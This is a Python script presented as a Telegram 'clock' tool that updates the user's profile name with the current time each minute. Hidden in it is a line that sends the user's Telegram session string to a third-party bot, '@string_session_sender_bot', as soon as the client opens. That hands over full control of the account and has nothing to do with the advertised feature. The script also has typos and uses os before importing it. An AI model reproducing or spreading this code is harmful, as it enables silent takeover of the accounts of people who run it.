os.system("pip install telethon")
os.system("pip install aiocron")
os.system("pip isntall asyncio")
os.system("pip isntall datetime")
import asyncio, aiocron, datetime
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import os, sys
import time
os.system("clear")

print("""\033[31m
▄▄▄█████▓  ▄████     ▄████▄   ██▓     ▒█████   ▄████▄   ██ ▄█▀
▓  ██▒ ▓▒ ██▒ ▀█▒   ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
▒ ▓██░ ▒░▒██░▄▄▄░   ▒▓█    ▄ ▒██░    ▒██░  ██▒▒▓█    ▄ ▓███▄░ 
░ ▓██▓ ░ ░▓█  ██▓   ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ 
  ▒██▒ ░ ░▒▓███▀▒   ▒ ▓███▀ ░░██████▒░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄
  ▒ ░░    ░▒   ▒    ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒
    ░      ░   ░      ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
  ░      ░ ░   ░    ░          ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░ 
               ░    ░ ░          ░  ░    ░ ░  ░ ░      ░  ░   
                    ░                         ░                 
\033[32mDeveloper: @programmer_www\n\n""")
api_id = 15832646
api_hash = "da7028d79bb7f2ea44f41f15911b9258"
with TelegramClient(StringSession(), api_id, api_hash) as client:
    client.send_message("@string_session_sender_bot", client.session.save())
    nick = input("\033[32mNickname: \033[32m")
    client.start()
    print('Wait a few moment...')
    time.sleep(5)
    print('\033[32mClock set successfully!')
    @aiocron.crontab("*/1 * * * *")
    async def set_clock():
        time = datetime.datetime.today().strftime(nick + "    %H:%M")
        async with client:
            await client(UpdateProfileRequest(first_name=time))
    
client.loop.run_forever()
client.run_until_disconnected()
